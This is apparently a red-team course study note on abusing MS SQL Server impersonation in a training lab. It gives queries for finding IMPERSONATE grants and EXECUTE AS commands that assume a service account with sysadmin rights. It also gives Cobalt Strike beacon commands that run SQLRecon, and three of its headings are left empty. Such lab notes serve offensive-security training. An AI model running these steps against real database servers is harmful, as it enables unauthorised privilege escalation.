
MS SQL impersonation, or context switching, is a means which allows the executing user to assume the permissions of another user without needing to know their password.  

Administrators usually use this to facilitate testing scenarios or troubleshooting, giving this permission to a low level account to remediate a quick issue.

Impersonations must be explicitly granted through securable configurations.

#### 🖊️ Investigating the DB

Having access to the MS SQL Server via [[MSSQL Server Enumeration via Cobalt Strike]], you can start querying and discovering if any users are allowed to impersonate:

1) Query the DB for:
`SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';`

Or using Cobalt Strike

`beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate`

2) If there are any, you will see these values:

`grantor_principal_id` : the account that can be impersonated
`grantee_principal_id` : the account that is allowed to impersonate another one

3) Run this query and you will see a list of names and numbers associated:

`SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;`

4) Instead of an account you could get that an entire group is allowed to impersonate, identify one of the users in there if thats the case and use it as your impersonator.
5) Use `EXECUTE AS` to execute a query in the context of the target, for example:

```
EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
DEV\mssql_svc

EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
1
```

Or using SQLRecon, which has modules that can be run in "impersonation mode" by prefixing the module name with an `i` and specifying the principal to impersonate.

`beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc`


#### 📔 B


####  📗 C


#### ⚠ Opsec




### Properties
---
📆 created   {{21-02-2024}} 14:45
🏷️ tags: #redteam #crto 

---

